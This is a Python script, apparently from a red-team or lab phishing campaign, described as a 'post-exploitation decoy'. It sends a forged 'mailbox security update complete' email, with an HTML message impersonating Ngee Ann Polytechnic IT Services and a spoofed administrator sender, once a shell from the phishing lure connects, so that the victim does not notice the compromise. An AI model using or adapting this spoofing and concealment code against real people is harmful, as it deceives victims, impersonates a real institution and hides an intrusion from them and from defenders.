"""Post-exploitation decoy: after the lure runs, send the victim a 'update complete / thank you'
confirmation so the social engineering holds and they don't suspect anything. From the same admin
spoof as the lure. Fired automatically by handler.py when the shell connects. Runs on Kali."""
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

MAILSRV = "10.4.20.21"
TO = "RemoteIT@mail.np.local"
ENVELOPE_FROM = "it-notifications@np-mail-security.com"
HEADER_FROM = "NP IT Administrator <admin@mail.np.local>"

HTML = """\
<html><body style="font-family:Segoe UI,Arial,sans-serif;color:#222;">
<table width="600" cellpadding="0" cellspacing="0" style="border:1px solid #ddd;">
<tr><td style="background:#002a5c;padding:16px 24px;color:#fff;font-size:18px;">
  Ngee Ann Polytechnic &mdash; IT Services</td></tr>
<tr><td style="padding:24px;">
  <p>Dear RemoteIT user,</p>
  <p style="color:#1a7f37;"><b>&#10004; Your mailbox security update completed successfully.</b></p>
  <p>No further action is required. Your account is fully active and your mailbox limits have been
  restored. Thank you for keeping your account secure.</p>
  <p>Regards,<br>NP IT Administrator</p>
</td></tr>
<tr><td style="background:#f4f4f4;padding:12px 24px;font-size:11px;color:#888;">
  This is an automated message from NP IT Services. Please do not reply.</td></tr>
</table></body></html>"""

msg = MIMEMultipart("alternative")
msg["Subject"] = "Mailbox security update complete — thank you"
msg["From"] = HEADER_FROM
msg["To"] = TO
msg.attach(MIMEText("Your mailbox security update completed successfully. No further action is required.", "plain"))
msg.attach(MIMEText(HTML, "html"))

s = smtplib.SMTP(MAILSRV, 25, timeout=20)
s.ehlo()
s.sendmail(ENVELOPE_FROM, [TO], msg.as_string())
s.quit()
print("sent 'update complete' confirmation to", TO)
